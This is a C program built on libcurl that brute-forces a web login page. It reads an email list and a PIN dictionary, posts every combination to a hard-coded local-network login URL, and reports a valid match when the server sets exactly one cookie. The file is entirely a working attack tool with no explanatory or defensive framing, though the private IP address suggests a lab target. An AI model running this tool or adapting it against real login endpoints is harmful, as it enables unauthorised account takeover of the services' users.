#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <curl/curl.h>

#define URL_ENDPOINT "http://192.168.43.188:5000/login"
#define EMAILS_SOURCE "email_list"
#define PINS_SOURCE "pins.dic"

volatile sig_atomic_t stop = 0;

// Signal handler for graceful exit
void handle_signal(int sig) {
    printf("\n[*] Exiting the program...\n");
    stop = 1;
}

// Function to perform the login attempt
int try_login(const char *user_email, const char *user_pin) {
    CURL *curl;
    CURLcode res;
    int valid = 0;

    char post_data[256];
    snprintf(post_data, sizeof(post_data), "email=%s&pin=%s", user_email, user_pin);

    curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, URL_ENDPOINT);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);

        // Handle cookies (check if the server sets cookies)
        struct curl_slist *cookies = NULL;
        curl_easy_setopt(curl, CURLOPT_COOKIEFILE, ""); // Enable cookie engine
        res = curl_easy_perform(curl);

        if (res == CURLE_OK) {
            curl_easy_getinfo(curl, CURLINFO_COOKIELIST, &cookies);
            if (cookies != NULL) {
                struct curl_slist *current = cookies;
                int cookie_count = 0;
                while (current) {
                    cookie_count++;
                    current = current->next;
                }
                if (cookie_count == 1) { // Condition: Exactly one cookie set
                    printf("[+] Valid Match: %s:%s\n", user_email, user_pin);
                    valid = 1;
                }
                curl_slist_free_all(cookies);
            }
        } else {
            fprintf(stderr, "[-] Request failed: %s\n", curl_easy_strerror(res));
        }

        curl_easy_cleanup(curl);
    }

    return valid;
}

// Function to read file lines into a dynamically allocated array
char **read_file_lines(const char *file_path, int *line_count) {
    FILE *file = fopen(file_path, "r");
    if (!file) {
        perror("[-] Error opening file");
        exit(1);
    }

    char **lines = NULL;
    char buffer[256];
    *line_count = 0;

    while (fgets(buffer, sizeof(buffer), file)) {
        buffer[strcspn(buffer, "\n")] = '\0'; // Remove newline
        if (strlen(buffer) > 0) {
            lines = realloc(lines, sizeof(char *) * (*line_count + 1));
            lines[*line_count] = strdup(buffer);
            (*line_count)++;
        }
    }

    fclose(file);
    return lines;
}

// Free memory allocated for file lines
void free_file_lines(char **lines, int line_count) {
    for (int i = 0; i < line_count; i++) {
        free(lines[i]);
    }
    free(lines);
}

// Main function
int main() {
    // Set up signal handler
    signal(SIGINT, handle_signal);

    // Read emails and pins from files
    int email_count, pin_count;
    char **emails = read_file_lines(EMAILS_SOURCE, &email_count);
    char **pins = read_file_lines(PINS_SOURCE, &pin_count);

    printf("[*] Bruteforcing %s...\n", URL_ENDPOINT);

    // Perform brute-force attack
    for (int i = 0; i < pin_count && !stop; i++) {
        for (int j = 0; j < email_count && !stop; j++) {
            printf("[*] Trying: %s:%s\n", emails[j], pins[i]);
            if (try_login(emails[j], pins[i])) {
                printf("[*] Terminating...\n");
                stop = 1;
                break;
            }
        }
    }

    // Clean up
    free_file_lines(emails, email_count);
    free_file_lines(pins, pin_count);

    printf("[-] Exhausted all combinations.\n");
    return 0;
}
